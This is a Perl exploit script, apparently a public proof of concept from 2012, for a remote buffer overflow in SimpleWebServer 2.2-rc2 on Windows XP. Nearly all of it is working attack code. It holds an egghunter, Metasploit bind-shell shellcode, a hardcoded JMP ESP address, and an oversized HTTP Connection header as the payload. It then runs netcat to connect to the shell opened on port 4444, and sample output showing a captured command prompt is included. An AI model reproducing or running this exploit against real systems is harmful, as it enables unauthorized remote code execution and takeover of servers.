use IO::Socket; 
##############################################################################
# Exploit Title: SimpleWebServer 2.2-rc2 - Remote Buffer Overflow Exploit
# Date: 19/07/2012
# Author: mr.pr0n (@_pr0n_)
# Homepage: http://ghostinthelab.wordpress.com/
# Software Link: http://www.pmx.it/download/sws-2.2-rc2-i686.exe
# Version: 2.2 rc2
# Tested on: Windows XP SP3
##############################################################################
# root@bt:~/Desktop# perl sws2_2-rc2_poc.pl 192.168.178.43 80
# +---------------------------------------------------------------+ 
# |   Simple Web Server 2.2 rc2 - Remote Buffer Overflow Exploit  | 
# |                 mr.pr0n - http://ghostinthelab.wordpress.com  | 
# +---------------------------------------------------------------+ 
# 
# [+] Sending buffer (2104 bytes) to: 192.168.178.43:80 
# [+] Exploitation Done!
# [+] Please, wait couple of sec ...
# [+] Got shell?
# 
# Microsoft Windows XP [Version 5.1.2600]
# (C) Copyright 1985-2001 Microsoft Corp.
# 
# C:\Program Files\PMSoftware\sws>
##############################################################################
print "+---------------------------------------------------------------+ \n";
print "|   Simple Web Server 2.2 rc2 - Remote Buffer Overflow Exploit  | \n";
print "|                 mr.pr0n - http://ghostinthelab.wordpress.com  | \n";
print "+---------------------------------------------------------------+ \n";
if (@ARGV != 2)
{
   print "\n[-] Usage: $0 <target ip> <port> \n\n";
   exit();
}

$target = $ARGV[0]; # Target IP
$port 	= $ARGV[1]; # Target port

# The egghunter.
$egghunter  =
"\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02".
"\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8".
"w00t". # The 4 byte tag!
"\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7";
 
# MSF windows/shell_bind_tcp LPORT=4444
$shellcode =
"\xda\xc5\xd9\x74\x24\xf4\x2b\xc9\xba\x3a\x04\xcc\xb6\x5e".
"\xb1\x56\x31\x56\x19\x83\xee\xfc\x03\x56\x15\xd8\xf1\x30".
"\x5e\x95\xfa\xc8\x9f\xc5\x73\x2d\xae\xd7\xe0\x25\x83\xe7".
"\x63\x6b\x28\x8c\x26\x98\xbb\xe0\xee\xaf\x0c\x4e\xc9\x9e".
"\x8d\x7f\xd5\x4d\x4d\x1e\xa9\x8f\x82\xc0\x90\x5f\xd7\x01".
"\xd4\x82\x18\x53\x8d\xc9\x8b\x43\xba\x8c\x17\x62\x6c\x9b".
"\x28\x1c\x09\x5c\xdc\x96\x10\x8d\x4d\xad\x5b\x35\xe5\xe9".
"\x7b\x44\x2a\xea\x40\x0f\x47\xd8\x33\x8e\x81\x11\xbb\xa0".
"\xed\xfd\x82\x0c\xe0\xfc\xc3\xab\x1b\x8b\x3f\xc8\xa6\x8b".
"\xfb\xb2\x7c\x1e\x1e\x14\xf6\xb8\xfa\xa4\xdb\x5e\x88\xab".
"\x90\x15\xd6\xaf\x27\xfa\x6c\xcb\xac\xfd\xa2\x5d\xf6\xd9".
"\x66\x05\xac\x40\x3e\xe3\x03\x7d\x20\x4b\xfb\xdb\x2a\x7e".
"\xe8\x5d\x71\x17\xdd\x53\x8a\xe7\x49\xe4\xf9\xd5\xd6\x5e".
"\x96\x55\x9e\x78\x61\x99\xb5\x3c\xfd\x64\x36\x3c\xd7\xa2".
"\x62\x6c\x4f\x02\x0b\xe7\x8f\xab\xde\xa7\xdf\x03\xb1\x07".
"\xb0\xe3\x61\xef\xda\xeb\x5e\x0f\xe5\x21\xe9\x08\x2b\x11".
"\xb9\xfe\x4e\xa5\x2f\xa2\xc7\x43\x25\x4a\x8e\xdc\xd2\xa8".
"\xf5\xd4\x45\xd3\xdf\x48\xdd\x43\x57\x87\xd9\x6c\x68\x8d".
"\x49\xc1\xc0\x46\x1a\x09\xd5\x77\x1d\x04\x7d\xf1\x25\xce".
"\xf7\x6f\xe7\x6f\x07\xba\x9f\x0c\x9a\x21\x60\x5b\x87\xfd".
"\x37\x0c\x79\xf4\xd2\xa0\x20\xae\xc0\x39\xb4\x89\x41\xe5".
"\x05\x17\x4b\x68\x31\x33\x5b\xb4\xba\x7f\x0f\x68\xed\x29".
"\xf9\xce\x47\x98\x53\x98\x34\x72\x34\x5d\x77\x45\x42\x62".
"\x52\x33\xaa\xd2\x0b\x02\xd4\xda\xdb\x82\xad\x07\x7c\x6c".
"\x64\x8c\x8c\x27\x25\xa4\x04\xee\xbf\xf5\x48\x11\x6a\x39".
"\x75\x92\x9f\xc1\x82\x8a\xd5\xc4\xcf\x0c\x05\xb4\x40\xf9".
"\x29\x6b\x60\x28\x23";

$junk 		= "\x41" x (64 - length("w00tw00t") - length($shellcode));
$ret		= pack('V',0x7C874413);     	# JMP ESP - kernel32.dll
$nops 		= "\x90" x 20; 			# 20 nops.
$exploit   	= $junk."w00tw00t".$shellcode.$ret.$nops.$egghunter;

if ($socket = IO::Socket::INET->new
     (PeerAddr => $target,
      PeerPort => $port,
      Proto => "TCP"))
{
        $header =
        "GET / HTTP/1.1\r\n".
        "Host: ".$target." \r\n".
        "Connection:".$exploit."\r\n";
	print "\n[+] Sending buffer (".(length($exploit))." bytes) to: $target:$port \n";
        print $socket $header."\r\n";
        sleep(1);
        close($socket);
	print "[+] Exploitation Done!\n";
	print "[+] Please, wait couple of sec ...\n";
	sleep(15);
	print "[+] Got shell?\n\n";
        $command = "nc $target 4444";
        system ($command);
}
 
else
{
    print "[-] Connection to $target failed!\n";
}